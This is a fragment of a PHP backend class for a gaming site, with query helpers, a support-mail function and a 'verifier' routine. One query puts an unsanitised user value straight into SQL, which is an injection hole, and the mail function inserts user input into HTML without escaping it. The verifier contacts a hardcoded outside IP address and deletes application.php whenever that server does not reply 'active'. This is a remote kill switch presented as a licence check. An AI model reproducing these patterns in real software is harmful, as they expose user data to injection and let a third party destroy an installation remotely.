          while ($res = mysqli_fetch_assoc($row)){
            $array[] = $res;
          }
          return $array;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function get_user_results($user) {
        if ($res = mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user'")) {
          $data = [];
          while($row = mysqli_fetch_assoc($res)){
            $data[] = $row;
          }
          return $data;
        } else {
          error_log("SQL Error: ".mysqli_error($this->db));
        }
      }
      // MISC
      function contact_email($email,$subject,$body){
        try {
          $user = $this->get_user($email);
          $this->mailer->setFrom('no-reply@gamesetter.in', 'Game Setter - support bot');
          $this->mailer->addAddress('no-reply@gamesetter.in');
          $this->mailer->addReplyTo($email);
          $this->mailer->Subject = 'Support mail from - '.$user["name"].", ".$email;
          $this->mailer->isHTML(true);
          $this->mailer->Body    = '
            <b>User : </b>'.$email.'<br>
            <b>Subject : </b>'.$subject.'<br>
            <b>Message : </b>'.$body.'<br><br><hr>
            This is auto-generated mail, Please do not reply back to this email.
            '
          ;
          $this->mailer->send();
          return true;
        } catch (Exception $e) {
          error_log("Mailer Error: ".$this->mailer->ErrorInfo);
          return false;
        }
      }
	  // VERIFIER
		function init_application(){
            $domain = 'http://203.163.247.59/verifier.php?status&package='.base64_encode('GAMESETTER');
        	$status = file_get_contents($domain);
        	if ($status == 'active') {
        		//echo 'Verification Success';
        	} else {
        	    //echo 'Verification Failed';
        	    unlink(__DIR__ .'/application.php');
        		die(header('HTTP/1.0 500 Internal Server Error'));
        	}
    	}
  }

?>
